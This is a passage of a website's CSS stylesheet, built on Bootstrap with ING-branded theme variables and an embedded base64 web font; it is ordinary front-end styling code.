    --bs-form-check-bg-image: url(data:image/svg+xml,%3csvg\ xmlns=\'http://www.w3.org/2000/svg\'\ viewBox=\'0\ 0\ 20\ 20\'%3e%3cpath\ fill=\'none\'\ stroke=\'%23fff\'\ stroke-linecap=\'round\'\ stroke-linejoin=\'round\'\ stroke-width=\'3\'\ d=\'m6\ 10\ 3\ 3\ 6-6\'/%3e%3c/svg%3e)
}

.bs-form-check-input:checked[type=radio] {
    --bs-form-check-bg-image: url(data:image/svg+xml,%3csvg\ xmlns=\'http://www.w3.org/2000/svg\'\ viewBox=\'-4\ -4\ 8\ 8\'%3e%3ccircle\ r=\'2\'\ fill=\'%23fff\'/%3e%3c/svg%3e)
}

.bs-form-check-input[type=checkbox]:indeterminate {
    background-color: #0d6efd;
    border-color: #0d6efd;
    --bs-form-check-bg-image: url(data:image/svg+xml,%3csvg\ xmlns=\'http://www.w3.org/2000/svg\'\ viewBox=\'0\ 0\ 20\ 20\'%3e%3cpath\ fill=\'none\'\ stroke=\'%23fff\'\ stroke-linecap=\'round\'\ stroke-linejoin=\'round\'\ stroke-width=\'3\'\ d=\'M6\ 10h8\'/%3e%3c/svg%3e)
}

.bs-form-check-input:disabled {
    pointer-events: none;
    filter: none;
    opacity: 0.5
}

.bs-form-check-input:disabled~.bs-form-check-label {
    cursor: default;
    opacity: 0.5
}

.bs-form-switch .bs-form-check-input:focus {
    --bs-form-switch-bg: url(data:image/svg+xml,%3csvg\ xmlns=\'http://www.w3.org/2000/svg\'\ viewBox=\'-6\ -6\ 12\ 12\'%3e%3ccircle\ r=\'5\'\ fill=\'%23fff\'/%3e%3c/svg%3e)
}

.bs-form-switch .bs-form-check-input:checked {
    background-position: right center;
    background-color: #349651;
    border-color: #349651;
    --bs-form-switch-bg: url(data:image/svg+xml,%3csvg\ xmlns=\'http://www.w3.org/2000/svg\'\ viewBox=\'-6\ -6\ 12\ 12\'%3e%3ccircle\ r=\'5\'\ fill=\'%23fff\'/%3e%3c/svg%3e)
}

.bs-btn-check:disabled+.bs-btn,
.bs-btn-check:disabled+.ing-btn-outline-orange-lg,
.bs-btn-check:disabled+.ing-btn-orange-lg {
    pointer-events: none;
    filter: none;
    opacity: 0.65
}

.bs-input-group>.bs-form-control:focus,
.bs-input-group>.bs-form-select:focus,
.bs-input-group>.bs-form-floating:focus-within {
    z-index: 5
}

.bs-input-group .bs-btn:focus,
.bs-input-group .ing-btn-outline-orange-lg:focus,
.bs-input-group .ing-btn-orange-lg:focus {
    z-index: 5
}

.bs-btn {
    --bs-btn-padding-x: 0.75rem;
    --bs-btn-padding-y: 0.375rem;
    --bs-btn-font-family: ;
    --bs-btn-font-size: 1rem;
    --bs-btn-font-weight: 700;
    --bs-btn-line-height: 1.5;
    --bs-btn-color: var(--bs-body-color);
    --bs-btn-bg: transparent;
    --bs-btn-border-width: var(--bs-border-width);
    --bs-btn-border-color: transparent;
    --bs-btn-border-radius: var(--bs-border-radius);
    --bs-btn-hover-border-color: transparent;
    --bs-btn-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075);
    --bs-btn-disabled-opacity: 0.65;
    --bs-btn-focus-box-shadow: 0 0 0 0.125rem rgba(var(--bs-btn-focus-shadow-rgb), .5);
    font-family: var(--bs-btn-font-family);
    font-size: var(--bs-btn-font-size);
    font-weight: var(--bs-btn-font-weight);
    line-height: var(--bs-btn-line-height);
    text-decoration: none;
    vertical-align: middle;
    user-select: none;
    background-color: var(--bs-btn-bg);
    transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out
}

@media (prefers-reduced-motion:reduce) {
    .bs-btn {
        transition: none
    }
}

.bs-btn:hover,
.ing-btn-outline-orange-lg:hover,
.ing-btn-orange-lg:hover {
    color: var(--bs-btn-hover-color);
    background-color: var(--bs-btn-hover-bg);
    border-color: var(--bs-btn-hover-border-color)
}

.bs-btn-check+.bs-btn:hover,
.bs-btn-check+.ing-btn-outline-orange-lg:hover,
.bs-btn-check+.ing-btn-orange-lg:hover {
    color: var(--bs-btn-color);
    background-color: var(--bs-btn-bg);
    border-color: var(--bs-btn-border-color)
}

.bs-btn:focus-visible,
.ing-btn-outline-orange-lg:focus-visible,
.ing-btn-orange-lg:focus-visible {
    color: var(--bs-btn-hover-color);
    background-color: var(--bs-btn-hover-bg);
    border-color: var(--bs-btn-hover-border-color);
    outline: 0;
    box-shadow: var(--bs-btn-focus-box-shadow)
}

.bs-btn-check:focus-visible+.bs-btn,
.bs-btn-check:focus-visible+.ing-btn-outline-orange-lg,
.bs-btn-check:focus-visible+.ing-btn-orange-lg {
    border-color: var(--bs-btn-hover-border-color);
    outline: 0;
    box-shadow: var(--bs-btn-focus-box-shadow)
}

.bs-btn-check:checked+.bs-btn,
.bs-btn-check:checked+.ing-btn-outline-orange-lg,
.bs-btn-check:checked+.ing-btn-orange-lg,
:not(.bs-btn-check)+.bs-btn:active,
:not(.bs-btn-check)+.ing-btn-outline-orange-lg:active,
:not(.bs-btn-check)+.ing-btn-orange-lg:active,
.bs-btn:first-child:active,
.ing-btn-outline-orange-lg:first-child:active,
.ing-btn-orange-lg:first-child:active {
    color: var(--bs-btn-active-color);
    background-color: var(--bs-btn-active-bg);
    border-color: var(--bs-btn-active-border-color)
}

.bs-btn-check:checked+.bs-btn:focus-visible,
.bs-btn-check:checked+.ing-btn-outline-orange-lg:focus-visible,
.bs-btn-check:checked+.ing-btn-orange-lg:focus-visible,
:not(.bs-btn-check)+.bs-btn:active:focus-visible,
:not(.bs-btn-check)+.ing-btn-outline-orange-lg:active:focus-visible,
:not(.bs-btn-check)+.ing-btn-orange-lg:active:focus-visible,
.bs-btn:first-child:active:focus-visible,
.ing-btn-outline-orange-lg:first-child:active:focus-visible,
.ing-btn-orange-lg:first-child:active:focus-visible,
.bs-btn.bs-active:focus-visible,
.bs-active.ing-btn-outline-orange-lg:focus-visible,
.bs-active.ing-btn-orange-lg:focus-visible,
.bs-btn.bs-show:focus-visible,
.bs-show.ing-btn-outline-orange-lg:focus-visible,
.bs-show.ing-btn-orange-lg:focus-visible {
    box-shadow: var(--bs-btn-focus-box-shadow)
}

.bs-btn-check:checked:focus-visible+.bs-btn,
.bs-btn-check:checked:focus-visible+.ing-btn-outline-orange-lg,
.bs-btn-check:checked:focus-visible+.ing-btn-orange-lg {
    box-shadow: var(--bs-btn-focus-box-shadow)
}

.bs-btn:disabled,
.ing-btn-outline-orange-lg:disabled,
.ing-btn-orange-lg:disabled,
fieldset:disabled .bs-btn,
fieldset:disabled .ing-btn-outline-orange-lg,
fieldset:disabled .ing-btn-orange-lg {
    color: var(--bs-btn-disabled-color);
    pointer-events: none;
    background-color: var(--bs-btn-disabled-bg);
    border-color: var(--bs-btn-disabled-border-color);
    opacity: var(--bs-btn-disabled-opacity)
}

.bs-btn-link:focus-visible {
    color: var(--bs-btn-color)
}

.bs-btn-link:hover {
    color: var(--bs-btn-hover-color)
}

.bs-btn-group>.bs-btn-check:not(:checked)+.bs-btn:hover,
.bs-btn-group>.bs-btn-check:not(:checked)+.ing-btn-outline-orange-lg:hover,
.bs-btn-group>.bs-btn-check:not(:checked)+.ing-btn-orange-lg:hover,
.bs-btn-group-vertical>.bs-btn-check:not(:checked)+.bs-btn:hover,
.bs-btn-group-vertical>.bs-btn-check:not(:checked)+.ing-btn-outline-orange-lg:hover,
.bs-btn-group-vertical>.bs-btn-check:not(:checked)+.ing-btn-orange-lg:hover {
    background-color: #e9ecef
}

.bs-btn-group>.bs-btn-check:focus+.bs-btn,
.bs-btn-group>.bs-btn-check:focus+.ing-btn-outline-orange-lg,
.bs-btn-group>.bs-btn-check:focus+.ing-btn-orange-lg,
.bs-btn-group-vertical>.bs-btn-check:focus+.bs-btn,
.bs-btn-group-vertical>.bs-btn-check:focus+.ing-btn-outline-orange-lg,
.bs-btn-group-vertical>.bs-btn-check:focus+.ing-btn-orange-lg {
    box-shadow: inset 0 0 0 4px #fff;
    outline: 2px solid #335d7d !important;
    outline-offset: -2px
}

.bs-btn-group>.bs-btn-check:checked+.bs-btn,
.bs-btn-group>.bs-btn-check:checked+.ing-btn-outline-orange-lg,
.bs-btn-group>.bs-btn-check:checked+.ing-btn-orange-lg,
.bs-btn-group>.bs-btn-check:focus+.bs-btn,
.bs-btn-group>.bs-btn-check:focus+.ing-btn-outline-orange-lg,
.bs-btn-group>.bs-btn-check:focus+.ing-btn-orange-lg,
.bs-btn-group>.bs-btn:hover,
.bs-btn-group>.ing-btn-outline-orange-lg:hover,
.bs-btn-group>.ing-btn-orange-lg:hover,
.bs-btn-group>.bs-btn:focus,
.bs-btn-group>.ing-btn-outline-orange-lg:focus,
.bs-btn-group>.ing-btn-orange-lg:focus,
.bs-btn-group>.bs-btn:active,
.bs-btn-group>.ing-btn-outline-orange-lg:active,
.bs-btn-group>.ing-btn-orange-lg:active,
.bs-btn-group-vertical>.bs-btn-check:checked+.bs-btn,
.bs-btn-group-vertical>.bs-btn-check:checked+.ing-btn-outline-orange-lg,
.bs-btn-group-vertical>.bs-btn-check:checked+.ing-btn-orange-lg,
.bs-btn-group-vertical>.bs-btn-check:focus+.bs-btn,
.bs-btn-group-vertical>.bs-btn-check:focus+.ing-btn-outline-orange-lg,
.bs-btn-group-vertical>.bs-btn-check:focus+.ing-btn-orange-lg,
.bs-btn-group-vertical>.bs-btn:hover,
.bs-btn-group-vertical>.ing-btn-outline-orange-lg:hover,
.bs-btn-group-vertical>.ing-btn-orange-lg:hover,
.bs-btn-group-vertical>.bs-btn:focus,
.bs-btn-group-vertical>.ing-btn-outline-orange-lg:focus,
.bs-btn-group-vertical>.ing-btn-orange-lg:focus,
.bs-btn-group-vertical>.bs-btn:active,
.bs-btn-group-vertical>.ing-btn-outline-orange-lg:active,
.bs-btn-group-vertical>.ing-btn-orange-lg:active {
    z-index: 1
}

.bs-dropdown-toggle-split::after,
.bs-dropup .bs-dropdown-toggle-split::after,
.bs-dropend .bs-dropdown-toggle-split::after {
    margin-left: 0
}

.bs-dropstart .bs-dropdown-toggle-split::before {
    margin-right: 0
}

.bs-list-group-numbered>.bs-list-group-item::before {
    content: counters(section, ".")". ";
    counter-increment: section
}

.bs-list-group-item-action:hover,
.bs-list-group-item-action:focus {
    z-index: 1;
    color: var(--bs-list-group-action-hover-color);
    text-decoration: none;
    background-color: var(--bs-list-group-action-hover-bg)
}

.bs-list-group-item-action:active {
    color: var(--bs-list-group-action-active-color);
    background-color: var(--bs-list-group-action-active-bg)
}

.bs-list-group-item:disabled {
    color: var(--bs-list-group-disabled-color);
    pointer-events: none;
    background-color: var(--bs-list-group-disabled-bg)
}

.bs-clearfix::after {
    display: block;
    clear: both;
    content: ""
}

.bs-focus-ring:focus {
    outline: 0;
    box-shadow: var(--bs-focus-ring-x, 0) var(--bs-focus-ring-y, 0) var(--bs-focus-ring-blur, 0) var(--bs-focus-ring-width) var(--bs-focus-ring-color)
}

.bs-ratio::before {
    display: block;
    padding-top: var(--bs-aspect-ratio);
    content: ""
}

.bs-visually-hidden,
.bs-visually-hidden-focusable:not(:focus):not(:focus-within) {
    width: 1px !important;
    height: 1px !important;
    padding: 0 !important;
    margin: -1px !important;
    overflow: hidden !important;
    clip: rect(0, 0, 0, 0) !important;
    white-space: nowrap !important;
    border: 0 !important
}

.bs-visually-hidden:not(caption),
.bs-visually-hidden-focusable:not(:focus):not(:focus-within):not(caption) {
    position: absolute !important
}

.bs-stretched-link::after {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 1;
    content: ""
}

.bs-text-truncate {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap
}

/*!
 * Bootstrap Icons v1.11.3 (https://icons.getbootstrap.com/)
 * Copyright 2019-2024 The Bootstrap Authors
 * Licensed under MIT (https://github.com/twbs/icons/blob/main/LICENSE)
 */
.bi::before,
[class^=bi-]::before,
[class*=" bi-"]::before {
    display: inline-block;
    font-family: "bootstrap-icons" !important;
    font-style: normal;
    font-weight: normal !important;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    vertical-align: -0.125em;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale
}

.bi-chevron-right::before {
    content: ""
}

.bi-geo-alt::before {
    content: ""
}

.bi-shield-check::before {
    content: ""
}

.bs-d-flex,
.ing-header {
    display: flex !important
}

.bs-d-none {
    display: none !important
}

.bs-border {
    border: var(--bs-border-width) var(--bs-border-style) var(--bs-border-color) !important
}

.bs-border-ing-orange {
    --bs-border-opacity: 1;
    border-color: rgba(var(--bs-ing-orange-rgb), var(--bs-border-opacity)) !important
}

.bs-border-2 {
    border-width: 2px !important
}

.bs-w-100 {
    width: 100% !important
}

.bs-mw-100 {
    max-width: 100% !important
}

.bs-flex-grow-1 {
    flex-grow: 1 !important
}

.ing-header {
    align-items: center !important
}

.bs-m-0 {
    margin: 0 !important
}

.bs-mx-4 {
    margin-right: 1rem !important;
    margin-left: 1rem !important
}

.bs-mx-auto {
    margin-right: auto !important;
    margin-left: auto !important
}

.bs-my-2 {
    margin-top: 0.5rem !important;
    margin-bottom: 0.5rem !important
}

.bs-mb-4 {
    margin-bottom: 1rem !important
}

.bs-mb-8 {
    margin-bottom: 2rem !important
}

.ing-header {
    padding: 0 !important
}

.bs-p-4 {
    padding: 1rem !important
}

.bs-px-2 {
    padding-right: 0.5rem !important;
    padding-left: 0.5rem !important
}

.bs-px-4 {
    padding-right: 1rem !important;
    padding-left: 1rem !important
}

.bs-pt-4 {
    padding-top: 1rem !important
}

.bs-pe-2 {
    padding-right: 0.5rem !important
}

.bs-pb-8 {
    padding-bottom: 2rem !important
}

.bs-ps-2 {
    padding-left: 0.5rem !important
}

.bs-text-nowrap {
    white-space: nowrap !important
}

.bs-text-ing-orange {
    --bs-text-opacity: 1;
    color: rgba(var(--bs-ing-orange-rgb), var(--bs-text-opacity)) !important
}

.bs-rounded {
    border-radius: var(--bs-border-radius) !important
}

.bs-outline-0 {
    outline: 0 !important
}

@media (min-width:768px) {
    .bs-d-sm-block {
        display: block !important
    }

    .bs-d-sm-none {
        display: none !important
    }

    .bs-pt-sm-8 {
        padding-top: 2rem !important
    }

    .bs-pe-sm-12 {
        padding-right: 3rem !important
    }

    .bs-text-sm-center {
        text-align: center !important
    }
}

:root {
    --bs-transition-duration-shortest: 150ms;
    --bs-transition-duration-shorter: 200ms;
    --bs-transition-duration-short: 250ms;
    --bs-transition-duration-standard: 300ms;
    --bs-transition-duration-long: 350ms;
    --bs-transition-duration-longer: 400ms;
    --bs-transition-duration-longest: 450ms;
    --bs-transition-duration-complex: 600ms;
    --bs-transition-duration-enteringscreen: 225ms;
    --bs-transition-duration-leavingscreen: 195ms
}

html {
    font-size: var(--bs-body-font-size)
}

body {
    margin: 0;
    font-size: var(--bs-body-font-size);
    font-weight: var(--bs-body-font-weight);
    line-height: var(--bs-body-line-height);
    color: var(--bs-body-color);
    text-align: var(--bs-body-text-align);
    background-color: var(--bs-body-bg);
    -webkit-text-size-adjust: 100%;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
}

.bs-fs-xl {
    font-size: 1.5rem
}

.bs-mw-sm {
    max-width: 768px !important
}

.bs-clear-before::before {
    content: "" !important
}

.bs-clear-after::after {
    content: "" !important
}

.ing-focus-outline:focus {
    box-shadow: inset 0 0 0 3px #fff;
    outline: 2px solid #335d7d !important;
    outline-offset: -2px
}

.bs-form-switch-focus-outline [type=checkbox]:focus {
    box-shadow: none;
    border-color: #fff;
    outline: 2px solid #335d7d !important;
    outline-offset: 0px
}

.ing-focus-outline-dark:focus {
    box-shadow: inset 0 0 0 3px #335d7d, 0 0 0 0;
    outline: 2px solid #fff !important;
    outline-offset: -2px
}

@media (min-width:768px) {
    .ing-focus-outline-dark-sm:focus {
        box-shadow: inset 0 0 0 3px #335d7d, 0 0 0 0;
        outline: 2px solid #fff !important;
        outline-offset: -2px
    }
}

@media (min-width:1025px) {
    .ing-focus-outline-dark-md:focus {
        box-shadow: inset 0 0 0 3px #335d7d, 0 0 0 0;
        outline: 2px solid #fff !important;
        outline-offset: -2px
    }
}

@media (min-width:1200px) {
    .ing-focus-outline-dark-lg:focus {
        box-shadow: inset 0 0 0 3px #335d7d, 0 0 0 0;
        outline: 2px solid #fff !important;
        outline-offset: -2px
    }
}

.ing-header {
    height: 50px
}

@media (min-width:768px) {
    .ing-header {
        height: 70px
    }
}

.ing-btn:not(:hover):focus-visible {
    --bs-btn-hover-bg: transparent
}

.ing-btn-outline:not(:hover):focus-visible {
    --bs-btn-hover-bg: transparent
}

.ing-input-group-btn:focus-visible,
.ing-input-group-btn-orange:focus-visible {
    --bs-btn-hover-bg: #fff;
    --bs-btn-hover-border-color: rgb(134, 182.5, 254)
}

.ing-btn-icon:not(:hover):focus-visible {
    --bs-btn-hover-bg: transparent
}

.ing-file-drop-zone::before {
    position: absolute;
    top: -8px;
    right: -8px;
    bottom: -8px;
    left: -8px;
    border: 10px dashed #6c757d;
    content: ""
}

.ing-file-drop-zone.ing-dragover::before {
    background-color: #cfe4f4
}
</style>
<style>
:host,
html {
    --_for-light: none;
    --_for-dark: none;
    --_orange: #ff6200;
    --_white: #ffffff;
    --_gray_100: #f0f0f0;
    --_gray_200: #d9d9d9;
    --_gray_300: #a8a8a8;
    --_gray_400: #696969;
    --_gray_500: #3d3d3d;
    --_gray_600: #333333;
    --_gray_700: #212121;
    --_gray_800: #050505;
    --_indigo_100: #ededf5;
    --_indigo_200: #dcdceb;
    --_indigo_300: #cbcae0;
    --_indigo_400: #bab9d6;
    --_indigo_500: #525199;
    --_indigo_600: #31305b;
    --_fuchsia_100: #f6e5ef;
    --_fuchsia_200: #eecce0;
    --_fuchsia_300: #e6b2d1;
    --_fuchsia_400: #dd99c2;
    --_fuchsia_500: #ab0066;
    --_fuchsia_600: #66003d;
    --_sky_100: #eff6fb;
    --_sky_200: #dfedf8;
    --_sky_300: #cfe4f4;
    --_sky_400: #bfdbf0;
    --_sky_500: #559bd1;
    --_sky_600: #335d7d;
    --_lime_100: #fafbeb;
    --_lime_200: #f6f7d8;
    --_lime_300: #f1f4c4;
    --_lime_400: #ecf0b1;
    --_lime_500: #d0d93c;
    --_lime_600: #7c8224;
    --_leaf_100: #eaf4ed;
    --_leaf_200: #d6eadc;
    --_leaf_300: #c2dfca;
    --_leaf_400: #aed5b9;
    --_leaf_500: #349651;
    --_leaf_600: #1f5a30;
    --_minus_400: #e14242;
    --_minus_500: #d70000;
    --_plus_400: #aed5b9;
    --_plus_500: #349651;
    --_annotation_400: #a5e5e5;
    --_annotation_600: #008080;
    --_opacity_10: 0.1;
    --_opacity_20: 0.2;
    --_opacity_30: 0.3;
    --_opacity_40: 0.4;
    --_opacity_50: 0.5;
    --_opacity_60: 0.6;
    --_opacity_70: 0.7;
    --_opacity_80: 0.8;
    --_opacity_90: 0.9;
    --_dimension_25: 0.125rem;
    --_dimension_50: 0.25rem;
    --_dimension_100: 0.5rem;
    --_dimension_200: 1rem;
    --_dimension_300: 1.5rem;
    --_dimension_400: 2rem;
    --_dimension_500: 2.5rem;
    --_dimension_600: 3rem;
    --_dimension_700: 3.5rem;
    --_dimension_800: 4rem;
    --_dimension_1000: 5rem;
    --_dimension_1200: 6rem
}

:host,
html {
    --_theme: light;
    --_for-light: initial;
    --bg_tab: #f6f6f6;
    --bg_tab-secondary: #fafafa;
    --border_default_width: 0.0625rem;
    --border_default_style: solid;
    --border_subtle_width: 0.0625rem;
    --border_subtle_style: solid;
    --border_primary_width: 0.0625rem;
    --border_primary_style: solid;
    --border_secondary_width: 0.0625rem;
    --border_secondary_style: solid;
    --border_tertiary_width: 0.0625rem;
    --border_tertiary_style: solid;
    --border_info_width: 0.0625rem;
    --border_info_style: solid;
    --border_info-inverse_width: 0.0625rem;
    --border_info-inverse_style: solid;
    --border_success_width: 0.0625rem;
    --border_success_style: solid;
    --border_warning_width: 0.0625rem;
    --border_warning_style: solid;
    --border_error_width: 0.0625rem;
    --border_error_style: solid;
    --border_disabled_width: 0.0625rem;
    --border_disabled_style: solid;
    --border_inverse_width: 0.0625rem;
    --border_inverse_style: solid;
    --border_emphasis_width: 0.0625rem;
    --border_emphasis_style: solid;
    --border_dropZone-default_width: 0.0625rem;
    --border_dropZone-default_style: dashed;
    --border_dropZone-disabled_width: 0.0625rem;
    --border_dropZone-disabled_style: dashed;
    --border_onColor_width: 0.0625rem;
    --border_onColor_style: solid;
    --border_focus-inner_style: solid;
    --border_focus-outer_style: solid;
    --opacity_pressed: var(--_opacity_60);
    --opacity_overlay: var(--_opacity_70);
    --fg_default: var(--_gray_600);
    --fg_subtle: var(--_gray_400);
    --fg_disabled: var(--_gray_300);
    --fg_onColor: var(--_white);
    --fg_inverse: var(--_white);
    --fg_primary: var(--_orange);
    --fg_secondary: var(--_indigo_500);
    --fg_tertiary: var(--_fuchsia_500);
    --fg_info: var(--_sky_500);
    --fg_success: var(--_leaf_500);
    --fg_warning: var(--_orange);
    --fg_error: var(--_minus_500);
    --bg_default: var(--_white);
    --bg_page: var(--_gray_100);
    --bg_subtle: var(--_gray_200);
    --bg_overlay: rgba(51, 51, 51, 0.7);
    --bg_primary: var(--_orange);
    --bg_secondary: var(--_indigo_500);
    --bg_secondary-subtle: var(--_indigo_200);
    --bg_tertiary: var(--_fuchsia_500);
    --bg_info: var(--_sky_500);
    --bg_success: var(--_leaf_200);
    --bg_done: var(--_leaf_500);
    --bg_hover-primary: var(--_sky_300);
    --bg_hover-secondary: var(--_indigo_200);
    --bg_hover-tertiary: var(--_fuchsia_200);
    --bg_highlight: var(--_sky_200);
    --bg_disabled: var(--_gray_200);
    --bg_page-tags: var(--_gray_200);
    --bg_page-tags-inverse: var(--_indigo_500);
    --bg_page-library: var(--_white);
    --bg_tab-inverse: var(--_indigo_600);
    --bg_tab-secondary-inverse: var(--_indigo_500);
    --bg_tab-border: var(--_gray_100);
    --bg_tab-border-inverse: var(--_indigo_500);
    --bg_snackbar: var(--_gray_400);
    --bg_notification: var(--_minus_500);
    --bg_onColor: var(--_white);
    --bg_pageSecondary: var(--_white);
    --border_default_color: var(--_gray_400);
    --border_subtle_color: var(--_gray_200);
    --border_primary_color: var(--_orange);
    --border_secondary_color: var(--_indigo_500);
    --border_tertiary_color: var(--_fuchsia_500);
    --border_info_color: var(--_sky_500);
    --border_info-inverse_color: var(--_sky_400);
    --border_success_color: var(--_leaf_500);
    --border_warning_color: var(--_orange);
    --border_error_color: var(--_minus_500);
    --border_disabled_color: var(--_gray_300);
    --border_inverse_color: var(--_white);
    --border_emphasis_color: var(--_gray_600);
    --border_dropZone-default_color: var(--_gray_400);
    --border_dropZone-disabled_color: var(--_gray_300);
    --border_onColor_color: var(--_white);
    --border_focus-inner_color: var(--_white);
    --border_focus-inner_width: var(--_dimension_25);
    --border_focus-outer_color: var(--_sky_600);
    --border_focus-outer_width: var(--_dimension_25);
    --padding_xxs: var(--_dimension_50);
    --padding_xs: var(--_dimension_100);
    --padding_sm: var(--_dimension_200);
    --padding_md: var(--_dimension_300);
    --padding_lg: var(--_dimension_400);
    --padding_xl: var(--_dimension_500);
    --padding_xxl: var(--_dimension_600);
    --padding_xxxl: var(--_dimension_700);
    --gap_xxs: var(--_dimension_50);
    --gap_xs: var(--_dimension_100);
    --gap_sm: var(--_dimension_200);
    --gap_md: var(--_dimension_300);
    --gap_lg: var(--_dimension_400);
    --gap_xl: var(--_dimension_500);
    --gap_xxl: var(--_dimension_600);
    --gap_xxxl: var(--_dimension_700)
}

:host([data-theme~="dark"]) {
    --_theme: dark;
    --_for-dark: initial;
    --_for-light: none;
    --border_dropZone-default_style: solid;
    --border_dropZone-disabled_style: dash;
    --opacity_pressed: var(--_opacity_60);
    --opacity_overlay: var(--_opacity_70);
    --fg_default: var(--_gray_100);
    --fg_subtle: var(--_gray_200);
    --fg_inverse: var(--_gray_800);
    --fg_secondary: var(--_indigo_400);
    --fg_tertiary: var(--_fuchsia_400);
    --fg_info: var(--_sky_400);
    --fg_success: var(--_leaf_400);
    --fg_error: var(--_minus_400);
    --bg_default: var(--_gray_700);
    --bg_page: var(--_gray_800);
    --bg_subtle: var(--_gray_600);
    --bg_overlay: rgba(240, 240, 240, 0.7);
    --bg_secondary-subtle: var(--_indigo_400);
    --bg_tertiary: var(--_fuchsia_400);
    --bg_info: var(--_sky_600);
    --bg_success: var(--_leaf_600);
    --bg_done: var(--_leaf_400);
    --bg_hover-primary: var(--_sky_600);
    --bg_hover-secondary: var(--_indigo_600);
    --bg_hover-tertiary: var(--_fuchsia_600);
    --bg_highlight: var(--_sky_600);
    --bg_disabled: var(--_gray_400);
    --bg_page-tags: var(--_gray_600);
    --bg_page-tags-inverse: var(--_gray_200);
    --bg_page-library: var(--_gray_800);
    --bg_tab: var(--_gray_700);
    --bg_tab-inverse: var(--_indigo_500);
    --bg_tab-secondary: var(--_gray_500);
    --bg_tab-secondary-inverse: var(--_indigo_400);
    --bg_tab-border: var(--_gray_700);
    --bg_snackbar: var(--_gray_200);
    --bg_notification: var(--_minus_400);
    --bg_pageSecondary: var(--_gray_800);
    --border_subtle_color: var(--_gray_600);
    --border_secondary_color: var(--_indigo_400);
    --border_tertiary_color: var(--_fuchsia_400);
    --border_info_color: var(--_sky_400);
    --border_info-inverse_color: var(--_sky_500);
    --border_success_color: var(--_leaf_400);
    --border_error_color: var(--_minus_400);
    --border_disabled_color: var(--_gray_500);
    --border_inverse_color: var(--_gray_600);
    --border_emphasis_color: var(--_white);
    --border_dropZone-default_color: var(--_gray_500);
    --border_dropZone-disabled_color: var(--_gray_400);
    --border_focus-inner_color: var(--_sky_600);
    --border_focus-outer_color: var(--_white)
}

@font-face {
    font-family: "INGMe";
    src: url(data:font/woff2;base64,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